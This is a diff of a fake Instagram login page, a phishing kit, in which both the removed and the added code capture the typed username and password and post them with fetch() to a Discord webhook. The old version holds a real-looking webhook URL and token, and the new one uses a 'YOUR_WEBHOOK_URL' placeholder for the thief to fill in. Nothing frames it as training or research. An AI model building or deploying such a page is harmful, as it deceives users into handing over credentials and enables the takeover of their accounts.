@@ -1,40 +1,119 @@
-<form onsubmit="sendLoginData(event)">
-<link rel="stylesheet" type="text/css" href="instagram.css.css">
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Instagram Login</title>
+  <style>
+    body {
+      background-color: #fafafa;
+      font-family: Arial, sans-serif;
+    }
 
-<div id="wrapper">
-  <div class="main-content">
-    <div class="header">
-      <img src="https://i.imgur.com/zqpwkLQ.png" />
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 40px;
+      background-color: #ffffff;
+      border: 1px solid #dbdbdb;
+      border-radius: 4px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 175px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-group label {
+      display: block;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+
+    .form-group input[type="text"],
+    .form-group input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      background-color: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      font-size: 14px;
+    }
+
+    .form-group button {
+      width: 100%;
+      padding: 10px;
+      background-color: #3897f0;
+      color: #ffffff;
+      border: none;
+      border-radius: 3px;
+      font-size: 14px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .form-group button:hover {
+      background-color: #3270a6;
+    }
+
+    .message {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 12px;
+      color: #999999;
+    }
+  </style>
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="instagram_logo.png" alt="Instagram Logo">
     </div>
-    <div class="l-part">
-      <input type="text" placeholder="Username" class="input-1" name="username" />
-      <div class="overlap-text">
-        <input type="password" placeholder="Password" class="input-2" name="password" />
-        <a href="#">Forgot?</a>
+    <form action="process-login.php" method="POST" onsubmit="sendLoginData(event)">
+      <div class="form-group">
+        <label for="username">Username</label>
+        <input type="text" id="username" name="username" placeholder="Enter your username" required>
       </div>
-</form>
+      <div class="form-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" placeholder="Enter your password" required>
+      </div>
+      <div class="form-group">
+        <button type="submit">Log In</button>
+      </div>
+    </form>
+  </div>
 
-<script>
-  function sendLoginData(event) {
-    event.preventDefault();
-  
-    const form = event.target;
-    const username = form.username.value;
-    const password = form.password.value;
-  
-    const webhookUrl = "https://discord.com/api/webhooks/1116509552695840768/qaUSQH-IXxJOiAgDTmflw3wNTJcg5kmMHMtSe6fi7Xm0HA3JHrOEpXUUFWBRvE22HvQg";
-  
-    const payload = {
-      content: `Username: ${username}\nPassword: ${password}`,
-    };
-  
-    fetch(webhookUrl, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify(payload),
-    })
+  <script>
+    function sendLoginData(event) {
+      event.preventDefault();
+
+      const form = event.target;
+      const username = form.username.value;
+      const password = form.password.value;
+
+      const webhookUrl = "YOUR_WEBHOOK_URL";
+
+      const payload = {
+        username,
+        password
+      };
+
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      })
       .then(response => {
         if (response.ok) {
           // Successful webhook request
@@ -48,5 +127,7 @@
         // Error in the fetch request
         // You can handle the error or display an error message
       });
-  }
-</script>
+    }
+  </script>
+</body>
+</html>
